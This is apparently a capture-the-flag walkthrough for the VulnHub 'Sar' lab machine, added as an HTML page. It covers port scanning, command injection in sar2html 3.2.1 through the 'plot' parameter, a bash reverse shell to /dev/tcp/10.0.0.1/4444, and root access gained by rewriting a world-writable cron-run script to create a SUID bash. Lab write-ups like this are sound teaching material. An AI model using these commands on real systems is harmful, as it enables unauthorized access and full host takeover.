@@ -1,0 +1,124 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Sar Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Sar Walkthrough</h1>
+    
+    <hr>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#www-data">Shell - www-data</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+    
+    <p>This box is on the easy side.  It starts off with only a web server on port 80.  After web enumeration we find a vulnerable service running.  We exploit it to gain a shell as www-data.  Then we exploit a cron job to gain a root shell.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Fri Sep 24 11:04:26 2021 as: nmap -p- -oN ping_tcp 10.0.0.18&#13;&#10;Nmap scan report for 10.0.0.18&#13;&#10;Host is up (0.0018s latency).&#13;&#10;Not shown: 65534 closed ports&#13;&#10;PORT   STATE SERVICE&#13;&#10;80/tcp open  http&#13;&#10;MAC Address: 00:0C:29:56:34:62 (VMware)&#13;&#10;&#13;&#10;# Nmap done at Fri Sep 24 11:04:34 2021 -- 1 IP address (1 host up) scanned in 7.76 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Fri Sep 24 11:05:28 2021 as: nmap -p80 -sV -sC -oN script_tcp 10.0.0.18&#13;&#10;Nmap scan report for 10.0.0.18&#13;&#10;Host is up (0.00021s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))&#13;&#10;|_http-server-header: Apache/2.4.29 (Ubuntu)&#13;&#10;|_http-title: Apache2 Ubuntu Default Page: It works&#13;&#10;MAC Address: 00:0C:29:56:34:62 (VMware)&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Fri Sep 24 11:05:41 2021 -- 1 IP address (1 host up) scanned in 13.12 seconds
+    </pre>
+
+    <br>
+
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>The web server on port 80 seems to be the only service running.  I start off with some gobuster scans to try to enumerate any hidden directories.  Nothing turns up so I turn my attention to /robots.txt.</li>
+
+    <br>
+    <br>
+
+    <img src="../images/sar/robots.png">
+
+    <li>The robots.txt file lists "sar2HTML", so I visit that directory, which takes us to a webste hosting sar2html version 3.2.1.  I use searchsploit and look for an exploit for sar2html 3.2.1 and I get results.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Sars]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit sar2html&#13;&#10;---------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                    |  Path&#13;&#10;---------------------------------------------------------------------------------- ---------------------------------&#13;&#10;sar2html 3.2.1 - &apos;plot&apos; Remote Code Execution                                     | php/webapps/49344.py&#13;&#10;Sar2HTML 3.2.1 - Remote Command Execution                                         | php/webapps/47204.txt&#13;&#10;---------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results&#13;&#10;                                                                                                                    &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Sars]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit -m 49344&#13;&#10;  Exploit: sar2html 3.2.1 - &apos;plot&apos; Remote Code Execution&#13;&#10;      URL: https://www.exploit-db.com/exploits/49344&#13;&#10;     Path: /usr/share/exploitdb/exploits/php/webapps/49344.py&#13;&#10;File Type: Python script, ASCII text executable&#13;&#10;&#13;&#10;Copied to: /home/kali/Documents/VulnHub/Sars/49344.py
+    </pre>
+
+    <h2><a id="www-data">Shell - www-data</a></h2>
+
+    <li>I download php/webapps/49344.py to take a look at.</li>
+
+    <img src="../images/sar/exploit_script.png">
+
+    <br>
+    <br>
+
+    <li>Based on the exploit script above, we can simply execute commands by browsing to the url /sar2HTML/index.php?plot=;&lt;command&gt;</li>
+
+    <img src="../images/sar/manual_exploit.png">
+
+    <br>
+    <br>
+
+    <li>In the above, we can see how we are manually able to do what the script does, and it works.  We get command execution.  Now we go for a reverse shell.  I will use "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" for my reverse shell and url encode it.</li>
+
+    <img src="../images/sar/rev_shell.png">
+
+    <br>
+    <br>
+
+    <li>One of the first things I always do is check for cronjobs using "cat /etc/cron*"</li>
+
+    <pre>
+www-data@sar:/var/www/html$ cat /etc/cron*&#13;&#10;cat: /etc/cron.d: Is a directory&#13;&#10;cat: /etc/cron.daily: Is a directory&#13;&#10;cat: /etc/cron.hourly: Is a directory&#13;&#10;cat: /etc/cron.monthly: Is a directory&#13;&#10;cat: /etc/cron.weekly: Is a directory&#13;&#10;# /etc/crontab: system-wide crontab&#13;&#10;# Unlike any other crontab you don&apos;t have to run the `crontab&apos;&#13;&#10;# command to install the new version when you edit this file&#13;&#10;# and files in /etc/cron.d. These files also have username fields,&#13;&#10;# that none of the other crontabs do.&#13;&#10;&#13;&#10;SHELL=/bin/sh&#13;&#10;PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin&#13;&#10;&#13;&#10;# m h dom mon dow user&#9;command&#13;&#10;17 *&#9;* * *&#9;root    cd / &amp;&amp; run-parts --report /etc/cron.hourly&#13;&#10;25 6&#9;* * *&#9;root&#9;test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )&#13;&#10;47 6&#9;* * 7&#9;root&#9;test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )&#13;&#10;52 6&#9;1 * *&#9;root&#9;test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )&#13;&#10;#&#13;&#10;*/5  *    * * *   root    cd /var/www/html/ &amp;&amp; sudo ./finally.sh
+    </pre>
+
+    <li>This turns up something interesting.  Root is running /var/www/html/finally.sh on a cron job.  Let's see what finally.sh does.</li>
+
+    <pre>
+www-data@sar:/var/www/html$ cat finally.sh &#13;&#10;#!/bin/sh&#13;&#10;&#13;&#10;./write.sh
+    </pre>
+
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>It appears that finally.sh simply runs write.sh.  We do not have write permissions to finally.sh so we cannot exploit it directly.  So let's take a look at write.sh and see what we can do with that.</li>
+
+    <pre>
+www-data@sar:/var/www/html$ ls -la write.sh&#13;&#10;-rwxrwxrwx 1 www-data www-data 30 Oct 21  2019 write.sh&#13;&#10;www-data@sar:/var/www/html$ cat write.sh &#13;&#10;#!/bin/sh&#13;&#10;&#13;&#10;touch /tmp/gateway
+    </pre>
+
+    <li>write.sh simply creates the file /tmp/gateway.  However, we have write access to write.sh, so all we need to do is edit the contents with our own malicious command.  When root runs finally.sh under it's cronjob, it will execute write.sh, which will execute our malicious command.</li>
+
+    <pre>
+www-data@sar:/var/www/html$ cat write.sh &#13;&#10;#!/bin/sh&#13;&#10;&#13;&#10;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
+    </pre>
+
+    <li>The above command will create a bash file owned by root with the SUID bit set in the /tmp directory.  After editing it, we navigate to the /tmp folder and wait for the cronjob to execute.  Which is set for every 5 minutes.</li>
+    <ul>
+        <li>Once in the /tmp folder you can run the command "watch -n 1 ls -la" and the window will refresh the /tmp folder every 1 second using the ls -la command.  This is an easy way to watch for the creation of the rootbash file.</li>
+    </ul>
+
+    <pre>
+www-data@sar:/tmp$ ls -la&#13;&#10;total 1096&#13;&#10;drwxrwxrwt  2 root     root        4096 Sep 24 19:42 .&#13;&#10;drwxr-xr-x 24 root     root        4096 Oct 20  2019 ..&#13;&#10;-rwsr-sr-x  1 root     root     1113504 Sep 24 19:42 rootbash
+    </pre>
+
+    <li>Now we execute rootbash with the -p flag and we get a shell with root permissions.</li>
+    <ul>
+        <li>./rootbash -p</li>
+    </ul>
+</body>
+</html>
+
